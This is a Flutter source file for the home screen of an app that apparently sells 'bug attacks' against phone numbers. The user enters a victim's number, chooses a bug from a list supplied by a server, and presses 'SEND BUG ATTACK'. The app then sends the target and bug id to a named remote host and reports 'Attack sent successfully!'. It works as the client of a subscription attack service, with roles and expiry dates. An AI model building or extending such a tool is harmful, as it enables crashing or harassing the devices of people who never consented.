import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:chewie/chewie.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final TextEditingController targetController = TextEditingController();
  late final AnimationController _pulseController;
  String selectedBugId = "";
  bool isSending = false;
  String? responseMessage;
  
  late VideoPlayerController _videoController;
  ChewieController? _chewieController;
  bool isVideoInitialized = false;

  // --- BLACKENED BLUE HD ULTRA THEME ---
  static const Color _bgDark = Color(0xFF808080);           // Blackened Abyss Background
  static const Color _cardDark = Color(0xFF010A1A);         // Dark Navy Card
  static const Color _accentRed = Color(0xFF00E5FF);        // Cyber Neon Cyan
  static const Color _darkRed = Color(0xFF0D47A1);          // Deep Ocean Blue
  static const Color _softRed = Color(0xFF0288D1);          // Metallic Blue
  static const Color _textWhite = Color(0xFFFFFFFF);
  static const Color _textGrey = Color(0xFF94A3B8);
  static const Color _successGreen = Color(0xFF10B981);
  static const Color _errorRed = Color(0xFFEF4444);
  static const Color _warningOrange = Color(0xFFF59E0B);

  LinearGradient get _primaryGradient => const LinearGradient(
    colors: [Color(0xFF0277BD), Color(0xFF00E5FF)],        // Deep Blue to Neon Cyan
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  LinearGradient get _secondaryGradient => const LinearGradient(
    colors: [Color(0xFF011E43), Color(0xFF0288D1)],        // Dark Navy to Metallic Blue
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }

    _initializeVideoPlayer();
  }

  void _initializeVideoPlayer() {
    _videoController = VideoPlayerController.asset('assets/videos/banner.mp4');

    _videoController.initialize().then((_) {
      if (mounted) {
        setState(() {
          _videoController.setVolume(0);
          _chewieController = ChewieController(
            videoPlayerController: _videoController,
            autoPlay: true,
            looping: true,
            showControls: false,
            autoInitialize: true,
          );
          isVideoInitialized = true;
        });
      }
    }).catchError((error) {
      debugPrint("Video error: $error");
      if (mounted) {
        setState(() {
          isVideoInitialized = false;
        });
      }
    });
  }

  @override
  void dispose() {
    _pulseController.dispose();
    targetController.dispose();
    _videoController.dispose();
    _chewieController?.dispose();
    super.dispose();
  }

  String? _formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    final target = _formatPhoneNumber(rawInput);
    if (target == null || key.isEmpty) {
      _showMessageDialog("Invalid Number", "Use international format (e.g., +62, +1, +44)");
      return;
    }

    setState(() {
      isSending = true;
      responseMessage = null;
    });

    try {
      final res = await http.get(
        Uri.parse("http://serverpunyasenz.senzhosting.my.id:10030/sendBug?key=$key&target=$rawInput&bug=$selectedBugId")
      ).timeout(const Duration(seconds: 30));
      
      final data = jsonDecode(res.body);

      if (!mounted) return;

      if (data["cooldown"] == true) {
        setState(() => responseMessage = "⏳ Cooldown: Please wait a moment");
      } else if (data["valid"] == false) {
        setState(() => responseMessage = "❌ Invalid Session: Please login again");
      } else if (data["sended"] == false) {
        setState(() => responseMessage = "⚠️ Failed: Server under maintenance");
      } else {
        setState(() => responseMessage = "✅ Attack sent successfully!");
        targetController.clear();
      }
    } catch (e) {
      if (mounted) {
        setState(() => responseMessage = "❌ Error: Connection failed");
      }
    } finally {
      if (mounted) {
        setState(() => isSending = false);
      }
    }
  }

  void _showMessageDialog(String title, String msg) {
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: _cardDark,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(24)),
        child: Container(
          padding: const EdgeInsets.all(24),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  gradient: _primaryGradient,
                  shape: BoxShape.circle,
                ),
                child: const Icon(Icons.warning_rounded, color: _textWhite, size: 32),
              ),
              const SizedBox(height: 20),
              Text(
                title,
                style: const TextStyle(
                  color: _textWhite,
                  fontSize: 20,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 12),
              Text(
                msg,
                textAlign: TextAlign.center,
                style: const TextStyle(color: _textGrey, fontSize: 14),
              ),
              const SizedBox(height: 24),
              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  onPressed: () => Navigator.pop(context),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: _accentRed, // Cyber Neon Cyan
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(16),
                    ),
                    padding: const EdgeInsets.symmetric(vertical: 14),
                  ),
                  child: const Text("OK", style: TextStyle(color: _bgDark, fontWeight: FontWeight.bold)), // Black text for contrast
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showBugSelection() {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (context) => Container(
        height: MediaQuery.of(context).size.height * 0.65,
        decoration: BoxDecoration(
          color: _cardDark,
          borderRadius: const BorderRadius.only(
            topLeft: Radius.circular(28),
            topRight: Radius.circular(28),
          ),
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: _cardDark,
                borderRadius: const BorderRadius.only(
                  topLeft: Radius.circular(28),
                  topRight: Radius.circular(28),
                ),
              ),
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      gradient: _primaryGradient,
                      borderRadius: BorderRadius.circular(14),
                    ),
                    child: const Icon(Icons.bug_report, color: _textWhite, size: 22),
                  ),
                  const SizedBox(width: 14),
                  const Text(
                    "Pilih Bug",
                    style: TextStyle(color: _textWhite, fontSize: 18, fontWeight: FontWeight.bold),
                  ),
                  const Spacer(),
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _textGrey.withOpacity(0.1),
                        shape: BoxShape.circle,
                      ),
                      child: const Icon(Icons.close, color: _textGrey, size: 20),
                    ),
                  ),
                ],
              ),
            ),
            const Divider(color: Colors.white12, height: 1),
            Expanded(
              child: ListView.builder(
                padding: const EdgeInsets.all(16),
                itemCount: widget.listBug.length,
                itemBuilder: (context, index) {
                  final bug = widget.listBug[index];
                  final isSelected = selectedBugId == bug['bug_id'];
                  return Container(
                    margin: const EdgeInsets.only(bottom: 12),
                    decoration: BoxDecoration(
                      color: isSelected ? _accentRed.withOpacity(0.15) : _bgDark,
                      borderRadius: BorderRadius.circular(16),
                      border: Border.all(
                        color: isSelected ? _accentRed : Colors.white12,
                        width: isSelected ? 1.5 : 1,
                      ),
                    ),
                    child: ListTile(
                      leading: Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          gradient: isSelected ? _primaryGradient : null,
                          color: isSelected ? null : _bgDark,
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: Icon(
                          Icons.bug_report,
                          color: isSelected ? _textWhite : _accentRed,
                          size: 20,
                        ),
                      ),
                      title: Text(
                        bug['bug_name'],
                        style: TextStyle(
                          color: isSelected ? _accentRed : _textWhite,
                          fontWeight: FontWeight.w600,
                          fontSize: 14,
                        ),
                      ),
                      subtitle: Text(
                        "ID: ${bug['bug_id']}",
                        style: const TextStyle(color: _textGrey, fontSize: 11),
                      ),
                      trailing: isSelected
                          ? Container(
                              padding: const EdgeInsets.all(6),
                              decoration: BoxDecoration(
                                color: _successGreen,
                                shape: BoxShape.circle,
                              ),
                              child: const Icon(Icons.check, color: _textWhite, size: 14),
                            )
                          : null,
                      onTap: () {
                        setState(() => selectedBugId = bug['bug_id']);
                        Navigator.pop(context);
                      },
                    ),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bgDark,
      body: SafeArea(
        child: SingleChildScrollView(
          physics: const BouncingScrollPhysics(),
          padding: const EdgeInsets.all(20),
          child: Column(
            children: [
              // Profile Card Modern dengan tema biru kehitaman
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [_cardDark, _cardDark.withOpacity(0.8)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(24),
                  border: Border.all(color: _accentRed.withOpacity(0.2)),
                  boxShadow: [
                    BoxShadow(
                      color: _accentRed.withOpacity(0.1),
                      blurRadius: 10,
                      spreadRadius: 0,
                    ),
                  ],
                ),
                child: Row(
                  children: [
                    Container(
                      width: 70,
                      height: 70,
                      decoration: BoxDecoration(
                        gradient: _primaryGradient,
                        shape: BoxShape.circle,
                        boxShadow: [
                          BoxShadow(color: _accentRed.withOpacity(0.4), blurRadius: 20), // Cyan glow
                        ],
                      ),
                      child: ClipOval(
                        child: Image.asset(
                          'assets/images/reze.jpg',
                          fit: BoxFit.cover,
                          errorBuilder: (_, __, ___) => const Icon(
                            Icons.person,
                            color: _textWhite,
                            size: 40,
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(width: 20),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            widget.username,
                            style: const TextStyle(
                              color: _textWhite,
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                          const SizedBox(height: 8),
                          Row(
                            children: [
                              Container(
                                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                                decoration: BoxDecoration(
                                  color: _accentRed.withOpacity(0.2), // Cyan tint
                                  borderRadius: BorderRadius.circular(20),
                                  border: Border.all(color: _accentRed.withOpacity(0.3)),
                                ),
                                child: Text(
                                  widget.role,
                                  style: TextStyle(color: _accentRed, fontSize: 11, fontWeight: FontWeight.w600), // Cyan text
                                ),
                              ),
                              const SizedBox(width: 10),
                              Container(
                                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                                decoration: BoxDecoration(
                                  color: _darkRed.withOpacity(0.2), // Deep Blue tint
                                  borderRadius: BorderRadius.circular(20),
                                ),
                                child: Text(
                                  "Exp: ${widget.expiredDate}",
                                  style: const TextStyle(color: _textGrey, fontSize: 11),
                                ),
                              ),
                            ],
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              ),

              const SizedBox(height: 20),

              // Video Player dengan overlay teks biru neon
              if (isVideoInitialized && _chewieController != null)
                Stack(
                  children: [
                    Container(
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(20),
                        border: Border.all(color: _accentRed.withOpacity(0.3), width: 1.5), // Cyan border
                      ),
                      child: ClipRRect(
                        borderRadius: BorderRadius.circular(20),
                        child: AspectRatio(
                          aspectRatio: _videoController.value.aspectRatio,
                          child: Chewie(controller: _chewieController!),
                        ),
                      ),
                    ),
                    Positioned(
                      bottom: 20,
                      left: 0,
                      right: 0,
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        margin: const EdgeInsets.symmetric(horizontal: 20),
                        decoration: BoxDecoration(
                          gradient: _primaryGradient, // Blue to Cyan
                          borderRadius: BorderRadius.circular(12),
                          boxShadow: [
                            BoxShadow(
                              color: _accentRed.withOpacity(0.3), // Cyan glow
                              blurRadius: 8,
                            ),
                          ],
                        ),
                        child: const Text(
                          "NECROMANCER Is Back",
                          textAlign: TextAlign.center,
                          style: TextStyle(
                            color: _textWhite,
                            fontSize: 16,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                    ),
                  ],
                ),

              const SizedBox(height: 24),

              // Target Input dengan tema biru
              Container(
                decoration: BoxDecoration(
                  color: _cardDark,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: _accentRed.withOpacity(0.2)), // Cyan border
                ),
                child: TextField(
                  controller: targetController,
                  style: const TextStyle(color: _textWhite, fontSize: 14),
                  cursorColor: _accentRed, // Cyan cursor
                  keyboardType: TextInputType.phone,
                  decoration: InputDecoration(
                    hintText: "+62xxxxxxxxxx",
                    hintStyle: TextStyle(color: _textGrey.withOpacity(0.5), fontSize: 13),
                    border: InputBorder.none,
                    prefixIcon: const Icon(
                      Icons.phone_android_rounded,
                      color: _accentRed, // Cyan icon
                      size: 20,
                    ),
                    contentPadding: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
                  ),
                ),
              ),

              const SizedBox(height: 16),

              // Bug Selection dengan tema biru
              GestureDetector(
                onTap: _showBugSelection,
                child: Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: _cardDark,
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(color: _accentRed.withOpacity(0.2)), // Cyan border
                  ),
                  child: Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          gradient: _primaryGradient,
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: const Icon(Icons.bug_report, color: _textWhite, size: 20),
                      ),
                      const SizedBox(width: 14),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            const Text("Selected Bug", style: TextStyle(color: _textGrey, fontSize: 11)),
                            const SizedBox(height: 4),
                            Text(
                              widget.listBug.firstWhere((b) => b['bug_id'] == selectedBugId)['bug_name'],
                              style: const TextStyle(color: _textWhite, fontSize: 14, fontWeight: FontWeight.w600),
                            ),
                          ],
                        ),
                      ),
                      Icon(Icons.chevron_right, color: _accentRed, size: 24), // Cyan icon
                    ],
                  ),
                ),
              ),

              const SizedBox(height: 24),

              // Send Button dengan animasi pulse biru neon
              AnimatedBuilder(
                animation: _pulseController,
                builder: (context, child) {
                  return Container(
                    width: double.infinity,
                    height: 56,
                    decoration: BoxDecoration(
                      gradient: _primaryGradient, // Blue to Cyan Gradient
                      borderRadius: BorderRadius.circular(20),
                      boxShadow: [
                        BoxShadow(
                          color: _accentRed.withOpacity(0.3 * _pulseController.value), // Cyan pulse glow
                          blurRadius: 16,
                        ),
                      ],
                    ),
                    child: ElevatedButton(
                      onPressed: isSending ? null : _sendBug,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.transparent,
                        shadowColor: Colors.transparent,
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
                      ),
                      child: isSending
                          ? const SizedBox(
                              width: 24,
                              height: 24,
                              child: CircularProgressIndicator(color: _textWhite, strokeWidth: 2.5),
                            )
                          : const Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(Icons.rocket_launch_rounded, color: _textWhite, size: 22),
                                SizedBox(width: 10),
                                Text("SEND BUG ATTACK", style: TextStyle(color: _textWhite, fontWeight: FontWeight.bold, fontSize: 15)),
                              ],
                            ),
                    ),
                  );
                },
              ),

              // Response Message
              if (responseMessage != null) ...[
                const SizedBox(height: 20),
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: responseMessage!.contains('✅')
                        ? _successGreen.withOpacity(0.1)
                        : responseMessage!.contains('❌')
                            ? _errorRed.withOpacity(0.1)
                            : responseMessage!.contains('⚠️')
                                ? _warningOrange.withOpacity(0.1)
                                : _accentRed.withOpacity(0.1), // Cyan tint
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(
                      color: responseMessage!.contains('✅')
                          ? _successGreen.withOpacity(0.3)
                          : responseMessage!.contains('❌')
                              ? _errorRed.withOpacity(0.3)
                              : responseMessage!.contains('⚠️')
                                  ? _warningOrange.withOpacity(0.3)
                                  : _accentRed.withOpacity(0.3), // Cyan border
                    ),
                  ),
                  child: Row(
                    children: [
                      Icon(
                        responseMessage!.contains('✅')
                            ? Icons.check_circle
                            : responseMessage!.contains('❌')
                                ? Icons.error
                                : Icons.warning,
                        color: responseMessage!.contains('✅')
                            ? _successGreen
                            : responseMessage!.contains('❌')
                                ? _errorRed
                                : _warningOrange,
                        size: 22,
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Text(
                          responseMessage!,
                          style: TextStyle(
                            color: responseMessage!.contains('✅')
                                ? _successGreen
                                : responseMessage!.contains('❌')
                                    ? _errorRed
                                    : _warningOrange,
                            fontWeight: FontWeight.w600,
                            fontSize: 13,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ],

              const SizedBox(height: 20),
            ],
          ),
        ),
      ),
    );
  }
}